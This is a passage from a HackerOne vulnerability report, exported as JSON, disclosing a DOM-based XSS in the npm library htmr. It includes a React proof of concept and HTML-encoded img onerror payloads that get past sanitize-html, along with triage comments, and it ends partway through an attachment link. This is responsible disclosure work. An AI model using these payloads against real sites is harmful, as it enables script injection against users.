{"id":753971,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC83NTM5NzE=","url":"https://hackerone.com/reports/753971","title":"[htmr] DOM-based XSS","state":"Closed","substate":"resolved","severity_rating":"medium","readable_substate":"Resolved","created_at":"2019-12-08T13:23:59.024Z","submitted_at":"2019-12-08T13:23:59.024Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"visat","url":"/visat","profile_picture_urls":{"small":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":23949,"url":"https://hackerone.com/nodejs-ecosystem","handle":"nodejs-ecosystem","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"paused","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Node.js third-party modules","twitter_handle":"","website":"https://nodejs.org/en/security/","about":"This program is used to handle vulnerabilities in the Node.js ecosystem."}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2020-03-15T08:10:39.848Z","bug_reporter_agreed_on_going_public_at":null,"team_member_agreed_on_going_public_at":"2020-02-14T08:10:36.343Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Hi,\n\nI would like to report DOM-based XSS in htmr.\nIt allows attackers to insert malicious JavaScript payload into the page.\n\n# Module\n\n**module name:** htmr\n**version:** 0.8.6\n**npm page:** `https://www.npmjs.com/package/htmr`\n\n## Module Description\n\nSimple and lightweight (\u003c 2kB) HTML string to react element conversion library\n\n## Module Stats\n\n[6,877] weekly downloads\n\n# Vulnerability\n\n## Vulnerability Description\n\nThis module uses `innerHTML` [ref](https://github.com/pveyes/htmr/blob/6e3607a2186d6166eaf395e5272cb9a80c4e2cf6/src/browser.ts#L21) to unescape HTML entities. This leads to DOM-based XSS by inserting HTML-encoded XSS payload (see PoC).\n\n## Steps To Reproduce:\n\n1. Create a React app: `create-react-app xss-htmr`\n2. Install `htmr` module: `cd xss-htmr; npm i htmr`\n3. Edit `src/App.js` file to this:\n\n```\nimport React from 'react';\nimport convert from 'htmr';\n\nexport default function App() {\n  return convert(`\u003cp\u003eHash: ${window.location.hash}\u003c/p\u003e`);\n}\n```\n4. Run the server: `npm run start`\n5. Visit `http://localhost:3000/#\u0026lt;img/src/onerror=alert('xss')\u0026gt;`, an alert will popup.\n\n{F653977}\n\n## Supporting Material/References:\n\n- macOS Mojave 10.14.6\n- Node 12.13.1\n- NPM 6.12.1\n- Chrome 78.0.3904.108\n\n# Wrap up\n\n- I contacted the maintainer to let them know: [N] \n- I opened an issue in the related repository: [N] \n\nThank you and regards,\nVisat\n\n## Impact\n\nDOM-based XSS","vulnerability_information_html":"\u003cp\u003eHi,\u003c/p\u003e\n\n\u003cp\u003eI would like to report DOM-based XSS in htmr.\u003cbr\u003e\nIt allows attackers to insert malicious JavaScript payload into the page.\u003c/p\u003e\n\n\u003ch1 id=\"module\"\u003eModule\u003c/h1\u003e\n\n\u003cp\u003e\u003cstrong\u003emodule name:\u003c/strong\u003e htmr\u003cbr\u003e\n\u003cstrong\u003eversion:\u003c/strong\u003e 0.8.6\u003cbr\u003e\n\u003cstrong\u003enpm page:\u003c/strong\u003e \u003ccode\u003ehttps://www.npmjs.com/package/htmr\u003c/code\u003e\u003c/p\u003e\n\n\u003ch2 id=\"module-description\"\u003eModule Description\u003c/h2\u003e\n\n\u003cp\u003eSimple and lightweight (\u0026lt; 2kB) HTML string to react element conversion library\u003c/p\u003e\n\n\u003ch2 id=\"module-stats\"\u003eModule Stats\u003c/h2\u003e\n\n\u003cp\u003e[6,877] weekly downloads\u003c/p\u003e\n\n\u003ch1 id=\"vulnerability\"\u003eVulnerability\u003c/h1\u003e\n\n\u003ch2 id=\"vulnerability-description\"\u003eVulnerability Description\u003c/h2\u003e\n\n\u003cp\u003eThis module uses \u003ccode\u003einnerHTML\u003c/code\u003e \u003ca href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fpveyes%2Fhtmr%2Fblob%2F6e3607a2186d6166eaf395e5272cb9a80c4e2cf6%2Fsrc%2Fbrowser.ts%23L21\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eref\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e to unescape HTML entities. This leads to DOM-based XSS by inserting HTML-encoded XSS payload (see PoC).\u003c/p\u003e\n\n\u003ch2 id=\"steps-to-reproduce\"\u003eSteps To Reproduce:\u003c/h2\u003e\n\n\u003col\u003e\n\u003cli\u003eCreate a React app: \u003ccode\u003ecreate-react-app xss-htmr\u003c/code\u003e\n\u003c/li\u003e\n\u003cli\u003eInstall \u003ccode\u003ehtmr\u003c/code\u003e module: \u003ccode\u003ecd xss-htmr; npm i htmr\u003c/code\u003e\n\u003c/li\u003e\n\u003cli\u003eEdit \u003ccode\u003esrc/App.js\u003c/code\u003e file to this:\u003c/li\u003e\n\u003c/ol\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eimport React from \u0026#39;react\u0026#39;;\nimport convert from \u0026#39;htmr\u0026#39;;\n\nexport default function App() {\n  return convert(`\u0026lt;p\u0026gt;Hash: ${window.location.hash}\u0026lt;/p\u0026gt;`);\n}\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003col\u003e\n\u003cli\u003eRun the server: \u003ccode\u003enpm run start\u003c/code\u003e\n\u003c/li\u003e\n\u003cli\u003eVisit \u003ccode\u003ehttp://localhost:3000/#\u0026amp;lt;img/src/onerror=alert(\u0026#39;xss\u0026#39;)\u0026amp;gt;\u003c/code\u003e, an alert will popup.\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003cp\u003e\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"Screen_Shot_2019-12-08_at_20.00.34.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/VJU4rU1syijcgX18pofqtuNL?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2019-12-08_at_20.00.34.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2019-12-08_at_20.00.34.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQ4BCTVX7H%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T064656Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQD9KoIrMtYjsPMNAoz3fkIjMCGzGeE4AC6fZNsgc%2FNK1QIhANJsfJivva8u7YF1XCVwz2O44bXLlD4DSJhj7xaMke6RKrQDCFYQARoMMDEzNjE5Mjc0ODQ5IgzmYD94JaVjjIU2krEqkQPkOp7o1Y%2F3O46uPVkJpWKluhPjw6yqgkTOXGekCyVjJWTTKaV%2Fg4VslprjcyOrHq6Kvjx6FFrvI%2F0oeazfhhuVbsGzIX%2FDNyDl86o7E8p7xdE9njyFrZSTuG%2BcoCSQTNZm6K7xytZ808%2FmbOq1EsQaswjTfJE49knSO3dd6P9o4TMruMzu8iALfM0IqlU4CgtICPjNu1SwD5gIiOjS3JXo97WJ%2FeXaWM7uiiaZIfnwM1%2FJh%2B%2Bf4y2CVgdWsivBsUOOKr5Ffs4r9dvRgpxa%2BT%2FmspuhFLSjdwidy384ywNVej%2Fu5TtU0RmHvya7IsEPuuyEVKZ9GXWYeHJPMuJLhkj%2F9NgnnqTSYay6UqseBG9goY2oONYS%2Fy7uIy6pIkzSjH260rcLKe0FPxGZ3OZNA097jOWSnOIGGcV1YZW18F%2FQaHb3tqnILMft5hGAudbC%2F2kJRmQyb4mArK%2Bic9Gh50TdBT%2BX29t3Wo5dLJweBsKIOOdeF41%2BqY1abZEgoOIbiscyoLBMO4ChJxBEiM%2By%2Bjg8FjC%2B6ar%2FBTrqAdRlQf357Lw7olVqK9BuDw0RNDzAgG1%2BRjmEy94ivfSQKRkYnOaGVWNx1MekakiogYuOKzbAujbete9Cin2JFJP4a22qFOVAg7tsJ%2FeJITiLIkogRaku8DmGovq%2B04Yxq2jfRp5la%2FeG3Fqca5Jc2WM%2BO7QxCdRE21wSAgKnCwsy8vQV1X0gGJjUOV6UsIimNdWCtKUego7nGl1OprelVr%2FiPIFvPy%2BhWrWWJF9nHO59wa4OZtoRJ5df5%2ByoAAAuIWDBKZfHRv45K8z7hZFmm4sjyreHKi0tXU9Fadu828o5w%2B3CHi4r%2BAT0Pg%3D%3D\u0026amp;X-Amz-Signature=83f32f73ab7f8a38b0eccc6835b5f00794d708eca9573de22fdbe356feeba49b\" data-attachment-type=\"image/png\"\u003e\u003cimg src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/VJU4rU1syijcgX18pofqtuNL?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2019-12-08_at_20.00.34.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2019-12-08_at_20.00.34.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQ4BCTVX7H%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T064656Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQD9KoIrMtYjsPMNAoz3fkIjMCGzGeE4AC6fZNsgc%2FNK1QIhANJsfJivva8u7YF1XCVwz2O44bXLlD4DSJhj7xaMke6RKrQDCFYQARoMMDEzNjE5Mjc0ODQ5IgzmYD94JaVjjIU2krEqkQPkOp7o1Y%2F3O46uPVkJpWKluhPjw6yqgkTOXGekCyVjJWTTKaV%2Fg4VslprjcyOrHq6Kvjx6FFrvI%2F0oeazfhhuVbsGzIX%2FDNyDl86o7E8p7xdE9njyFrZSTuG%2BcoCSQTNZm6K7xytZ808%2FmbOq1EsQaswjTfJE49knSO3dd6P9o4TMruMzu8iALfM0IqlU4CgtICPjNu1SwD5gIiOjS3JXo97WJ%2FeXaWM7uiiaZIfnwM1%2FJh%2B%2Bf4y2CVgdWsivBsUOOKr5Ffs4r9dvRgpxa%2BT%2FmspuhFLSjdwidy384ywNVej%2Fu5TtU0RmHvya7IsEPuuyEVKZ9GXWYeHJPMuJLhkj%2F9NgnnqTSYay6UqseBG9goY2oONYS%2Fy7uIy6pIkzSjH260rcLKe0FPxGZ3OZNA097jOWSnOIGGcV1YZW18F%2FQaHb3tqnILMft5hGAudbC%2F2kJRmQyb4mArK%2Bic9Gh50TdBT%2BX29t3Wo5dLJweBsKIOOdeF41%2BqY1abZEgoOIbiscyoLBMO4ChJxBEiM%2By%2Bjg8FjC%2B6ar%2FBTrqAdRlQf357Lw7olVqK9BuDw0RNDzAgG1%2BRjmEy94ivfSQKRkYnOaGVWNx1MekakiogYuOKzbAujbete9Cin2JFJP4a22qFOVAg7tsJ%2FeJITiLIkogRaku8DmGovq%2B04Yxq2jfRp5la%2FeG3Fqca5Jc2WM%2BO7QxCdRE21wSAgKnCwsy8vQV1X0gGJjUOV6UsIimNdWCtKUego7nGl1OprelVr%2FiPIFvPy%2BhWrWWJF9nHO59wa4OZtoRJ5df5%2ByoAAAuIWDBKZfHRv45K8z7hZFmm4sjyreHKi0tXU9Fadu828o5w%2B3CHi4r%2BAT0Pg%3D%3D\u0026amp;X-Amz-Signature=83f32f73ab7f8a38b0eccc6835b5f00794d708eca9573de22fdbe356feeba49b\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003ch2 id=\"supporting-material-references\"\u003eSupporting Material/References:\u003c/h2\u003e\n\n\u003cul\u003e\n\u003cli\u003emacOS Mojave 10.14.6\u003c/li\u003e\n\u003cli\u003eNode 12.13.1\u003c/li\u003e\n\u003cli\u003eNPM 6.12.1\u003c/li\u003e\n\u003cli\u003eChrome 78.0.3904.108\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003ch1 id=\"wrap-up\"\u003eWrap up\u003c/h1\u003e\n\n\u003cul\u003e\n\u003cli\u003eI contacted the maintainer to let them know: [N] \u003c/li\u003e\n\u003cli\u003eI opened an issue in the related repository: [N] \u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003eThank you and regards,\u003cbr\u003e\nVisat\u003c/p\u003e\n\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003eDOM-based XSS\u003c/p\u003e\n","weakness":{"id":63,"name":"Cross-site Scripting (XSS) - DOM"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":653977,"file_name":"Screen_Shot_2019-12-08_at_20.00.34.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/VJU4rU1syijcgX18pofqtuNL?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2019-12-08_at_20.00.34.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2019-12-08_at_20.00.34.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ4BCTVX7H%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T064656Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQD9KoIrMtYjsPMNAoz3fkIjMCGzGeE4AC6fZNsgc%2FNK1QIhANJsfJivva8u7YF1XCVwz2O44bXLlD4DSJhj7xaMke6RKrQDCFYQARoMMDEzNjE5Mjc0ODQ5IgzmYD94JaVjjIU2krEqkQPkOp7o1Y%2F3O46uPVkJpWKluhPjw6yqgkTOXGekCyVjJWTTKaV%2Fg4VslprjcyOrHq6Kvjx6FFrvI%2F0oeazfhhuVbsGzIX%2FDNyDl86o7E8p7xdE9njyFrZSTuG%2BcoCSQTNZm6K7xytZ808%2FmbOq1EsQaswjTfJE49knSO3dd6P9o4TMruMzu8iALfM0IqlU4CgtICPjNu1SwD5gIiOjS3JXo97WJ%2FeXaWM7uiiaZIfnwM1%2FJh%2B%2Bf4y2CVgdWsivBsUOOKr5Ffs4r9dvRgpxa%2BT%2FmspuhFLSjdwidy384ywNVej%2Fu5TtU0RmHvya7IsEPuuyEVKZ9GXWYeHJPMuJLhkj%2F9NgnnqTSYay6UqseBG9goY2oONYS%2Fy7uIy6pIkzSjH260rcLKe0FPxGZ3OZNA097jOWSnOIGGcV1YZW18F%2FQaHb3tqnILMft5hGAudbC%2F2kJRmQyb4mArK%2Bic9Gh50TdBT%2BX29t3Wo5dLJweBsKIOOdeF41%2BqY1abZEgoOIbiscyoLBMO4ChJxBEiM%2By%2Bjg8FjC%2B6ar%2FBTrqAdRlQf357Lw7olVqK9BuDw0RNDzAgG1%2BRjmEy94ivfSQKRkYnOaGVWNx1MekakiogYuOKzbAujbete9Cin2JFJP4a22qFOVAg7tsJ%2FeJITiLIkogRaku8DmGovq%2B04Yxq2jfRp5la%2FeG3Fqca5Jc2WM%2BO7QxCdRE21wSAgKnCwsy8vQV1X0gGJjUOV6UsIimNdWCtKUego7nGl1OprelVr%2FiPIFvPy%2BhWrWWJF9nHO59wa4OZtoRJ5df5%2ByoAAAuIWDBKZfHRv45K8z7hZFmm4sjyreHKi0tXU9Fadu828o5w%2B3CHi4r%2BAT0Pg%3D%3D\u0026X-Amz-Signature=83f32f73ab7f8a38b0eccc6835b5f00794d708eca9573de22fdbe356feeba49b","file_size":162360,"type":"image/png"}],"allow_singular_disclosure_at":"2020-03-15T08:10:36.411Z","allow_singular_disclosure_after":-24964579.91397245,"singular_disclosure_allowed":true,"vote_count":12,"voters":["a_d_a_m","mygf","nessun00x","mayurudiniya","defectstar","justjeremy","raag","hxm7a","1khan1","afropack","and 2 more..."],"severity":{"rating":"medium","score":6.5,"author_type":"Team","metrics":{"attack_vector":"network","attack_complexity":"low","privileges_required":"low","user_interaction":"required","scope":"changed","confidentiality":"low","integrity":"low","availability":"low"}},"structured_scope":{"databaseId":2986,"asset_type":"SOURCE_CODE","asset_identifier":"Other module","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":6502744,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @visat,\n\nThank you for your submission. Your report is currently being reviewed and the HackerOne triage team will get back to you once there is additional information to share.\n\nKind regards,\n@beagle ","markdown_message":"\u003cp\u003eHi \u003ca href=\"/visat\"\u003e@visat\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eThank you for your submission. Your report is currently being reviewed and the HackerOne triage team will get back to you once there is additional information to share.\u003c/p\u003e\n\n\u003cp\u003eKind regards,\u003cbr\u003e\n\u003ca href=\"/beagle\"\u003e@beagle\u003c/a\u003e \u003c/p\u003e\n","automated_response":false,"created_at":"2019-12-09T12:57:51.880Z","updated_at":"2019-12-09T12:57:51.880Z","actor":{"username":"beagle","cleared":false,"url":"/beagle","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/458/833/024b7a83a4a54282cbcdf96b9b10a93700cf8743_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":true,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6502826,"is_internal":false,"editable":false,"type":"Activities::BugNotApplicable","message":"Hi @visat,\n\nThis library isn't made to protect you against XSS. The developer is responsible for sanitizing input before passing it to the `convert()` function. Your effort is nonetheless appreciated and we wish that you'll continue to research and submit any future security issues you find.\n\nKind regards,\n@beagle ","markdown_message":"\u003cp\u003eHi \u003ca href=\"/visat\"\u003e@visat\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eThis library isn\u0026#39;t made to protect you against XSS. The developer is responsible for sanitizing input before passing it to the \u003ccode\u003econvert()\u003c/code\u003e function. Your effort is nonetheless appreciated and we wish that you\u0026#39;ll continue to research and submit any future security issues you find.\u003c/p\u003e\n\n\u003cp\u003eKind regards,\u003cbr\u003e\n\u003ca href=\"/beagle\"\u003e@beagle\u003c/a\u003e \u003c/p\u003e\n","automated_response":false,"created_at":"2019-12-09T13:05:50.698Z","updated_at":"2019-12-09T13:05:50.698Z","actor":{"username":"beagle","cleared":false,"url":"/beagle","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/458/833/024b7a83a4a54282cbcdf96b9b10a93700cf8743_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":true,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6503537,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @beagle,\n\nLet me clarify a few things. So you said that \"The developer is responsible for sanitizing input before passing it to the `convert()` function\". Now let's say that a developer wants to insert a user-controlled input into a paragraph, ``convert(`\u003cp\u003e${userInput}\u003c/p\u003e`)``.\n\nSo how does the developer sanitize the `userInput`? By converting into HTML entities, right? (e.g. `\u003c` into `\u0026lt;`, `\u003e` into `\u0026gt;`, etc). So the developer will try to sanitize the user input by replacing them manually or using a module, for example [sanitize-html](https://www.npmjs.com/package/sanitize-html). For this proof of concept I'll use the module to mimic a real developer because it's a popular one. Install it by running `npm i sanitize-html`.\n\nLet's edit `src/App.js` into this:\n```\nimport React from 'react';\nimport convert from 'htmr';\nimport sanitizeHtml from 'sanitize-html';\n\nexport default function App() {\n  const userInput = '\u003cimg src=x onerror=alert(\"xss\")\u003e';\n  const sanitizedUserInput = sanitizeHtml(userInput);\n  return convert(`\u003cp\u003e${sanitizedUserInput}\u003c/p\u003e`);\n}\n```\n\nand start the server by running `npm run start`:\n{F654748}\n\nOkay so XSS **doesn't** work, as expected.\n\nBut now, let's change `userInput` into encoded HTML entities, i.e. `\u003c` into `\u0026lt;` and `\u003e` into `\u0026gt;`.\n```\nimport React from 'react';\nimport convert from 'htmr';\nimport sanitizeHtml from 'sanitize-html';\n\nexport default function App() {\n  const userInput = '\u0026lt;img src=x onerror=alert(\"xss\")\u0026gt;';\n  const sanitizedUserInput = sanitizeHtml(userInput);\n  return convert(`\u003cp\u003e${sanitizedUserInput}\u003c/p\u003e`);\n}\n```\n\nAnd start the server:\n{F654749}\n\nBoom, XSS is triggered. The developer **already sanitized** user input as you've said, but it is still vulnerable. How does that happen?\n\nLet's take a look at the source code [htmr/browser.ts#L30-L31](https://github.com/pveyes/htmr/blob/3f44a0bd826411161c88dcdbadb261edf511b3ed/src/browser.ts#L30-L31).\n```\n  // snip...\n  } else if (node.nodeType === NodeTypes.TEXT) {\n    const text = unescape(node.textContent);\n  // snip...\n```\n\nWhile converting nodes, if node is a TEXT, the module will `unescape` the node's `textContent`. In HTML, `textContent` already contains **decoded** characters. So for example, if a node's `innerHTML` is `\u0026lt;img...`, the node's `textContent` is `\u003cimg...`.\n\nNow let's take a look at `unescape` function.\n```\nfunction unescape(str: string): string {\n  // Here we use innerHTML to unescape html entities.\n  // This is okay because we use the returned value as react children\n  // not dangerouslySetInnerHTML\n  tempEl.innerHTML = str;\n  return tempEl.textContent!;\n}\n```\nThe author uses `innerHTML` to unescape the content. It is dangerous because it will introduce DOM-based XSS. The solution here is not to use `innerHTML` at all.\n\nI will appreciate if you take a look at this once again.\nThank you and regards,\nVisat","markdown_message":"\u003cp\u003eHi \u003ca href=\"/beagle\"\u003e@beagle\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eLet me clarify a few things. So you said that \u0026quot;The developer is responsible for sanitizing input before passing it to the \u003ccode\u003econvert()\u003c/code\u003e function\u0026quot;. Now let\u0026#39;s say that a developer wants to insert a user-controlled input into a paragraph, \u003ccode\u003econvert(`\u0026lt;p\u0026gt;${userInput}\u0026lt;/p\u0026gt;`)\u003c/code\u003e.\u003c/p\u003e\n\n\u003cp\u003eSo how does the developer sanitize the \u003ccode\u003euserInput\u003c/code\u003e? By converting into HTML entities, right? (e.g. \u003ccode\u003e\u0026lt;\u003c/code\u003e into \u003ccode\u003e\u0026amp;lt;\u003c/code\u003e, \u003ccode\u003e\u0026gt;\u003c/code\u003e into \u003ccode\u003e\u0026amp;gt;\u003c/code\u003e, etc). So the developer will try to sanitize the user input by replacing them manually or using a module, for example \u003ca href=\"/redirect?url=https%3A%2F%2Fwww.npmjs.com%2Fpackage%2Fsanitize-html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003esanitize-html\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e. For this proof of concept I\u0026#39;ll use the module to mimic a real developer because it\u0026#39;s a popular one. Install it by running \u003ccode\u003enpm i sanitize-html\u003c/code\u003e.\u003c/p\u003e\n\n\u003cp\u003eLet\u0026#39;s edit \u003ccode\u003esrc/App.js\u003c/code\u003e into this:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eimport React from \u0026#39;react\u0026#39;;\nimport convert from \u0026#39;htmr\u0026#39;;\nimport sanitizeHtml from \u0026#39;sanitize-html\u0026#39;;\n\nexport default function App() {\n  const userInput = \u0026#39;\u0026lt;img src=x onerror=alert(\u0026quot;xss\u0026quot;)\u0026gt;\u0026#39;;\n  const sanitizedUserInput = sanitizeHtml(userInput);\n  return convert(`\u0026lt;p\u0026gt;${sanitizedUserInput}\u0026lt;/p\u0026gt;`);\n}\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eand start the server by running \u003ccode\u003enpm run start\u003c/code\u003e:\u003cbr\u003e\n\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"Screen_Shot_2019-12-09_at_20.56.55.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/M8Kz6KHjZ1KwYe4gtYGb6y3A?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2019-12-09_at_20.56.55.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2019-12-09_at_20.56.55.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQ4BCTVX7H%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T064656Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQD9KoIrMtYjsPMNAoz3fkIjMCGzGeE4AC6fZNsgc%2FNK1QIhANJsfJivva8u7YF1XCVwz2O44bXLlD4DSJhj7xaMke6RKrQDCFYQARoMMDEzNjE5Mjc0ODQ5IgzmYD94JaVjjIU2krEqkQPkOp7o1Y%2F3O46uPVkJpWKluhPjw6yqgkTOXGekCyVjJWTTKaV%2Fg4VslprjcyOrHq6Kvjx6FFrvI%2F0oeazfhhuVbsGzIX%2FDNyDl86o7E8p7xdE9njyFrZSTuG%2BcoCSQTNZm6K7xytZ808%2FmbOq1EsQaswjTfJE49knSO3dd6P9o4TMruMzu8iALfM0IqlU4CgtICPjNu1SwD5gIiOjS3JXo97WJ%2FeXaWM7uiiaZIfnwM1%2FJh%2B%2Bf4y2CVgdWsivBsUOOKr5Ffs4r9dvRgpxa%2BT%2FmspuhFLSjdwidy384ywNVej%2Fu5TtU0RmHvya7IsEPuuyEVKZ9GXWYeHJPMuJLhkj%2F9NgnnqTSYay6UqseBG9goY2oONYS%2Fy7uIy6pIkzSjH260rcLKe0FPxGZ3OZNA097jOWSnOIGGcV1YZW18F%2FQaHb3tqnILMft5hGAudbC%2F2kJRmQyb4mArK%2Bic9Gh50TdBT%2BX29t3Wo5dLJweBsKIOOdeF41%2BqY1abZEgoOIbiscyoLBMO4ChJxBEiM%2By%2Bjg8FjC%2B6ar%2FBTrqAdRlQf357Lw7olVqK9BuDw0RNDzAgG1%2BRjmEy94ivfSQKRkYnOaGVWNx1MekakiogYuOKzbAujbete9Cin2JFJP4a22qFOVAg7tsJ%2FeJITiLIkogRaku8DmGovq%2B04Yxq2jfRp5la%2FeG3Fqca5Jc2WM%2BO7QxCdRE21wSAgKnCwsy8vQV1X0gGJjUOV6UsIimNdWCtKUego7nGl1OprelVr%2FiPIFvPy%2BhWrWWJF9nHO59wa4OZtoRJ5df5%2ByoAAAuIWDBKZfHRv45K8z7hZFmm4sjyreHKi0tXU9Fadu828o5w%2B3CHi4r%2BAT0Pg%3D%3D\u0026amp;X-Amz-Signature=9252b2d378f1cc8107347e680d4609bcf8a214d78a7b4c3a9e109cb74743c382\" data-attachment-type=\"image/png\"\u003e\u003cimg src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/M8Kz6KHjZ1KwYe4gtYGb6y3A?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2019-12-09_at_20.56.55.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2019-12-09_at_20.56.55.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQ4BCTVX7H%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T064656Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQD9KoIrMtYjsPMNAoz3fkIjMCGzGeE4AC6fZNsgc%2FNK1QIhANJsfJivva8u7YF1XCVwz2O44bXLlD4DSJhj7xaMke6RKrQDCFYQARoMMDEzNjE5Mjc0ODQ5IgzmYD94JaVjjIU2krEqkQPkOp7o1Y%2F3O46uPVkJpWKluhPjw6yqgkTOXGekCyVjJWTTKaV%2Fg4VslprjcyOrHq6Kvjx6FFrvI%2F0oeazfhhuVbsGzIX%2FDNyDl86o7E8p7xdE9njyFrZSTuG%2BcoCSQTNZm6K7xytZ808%2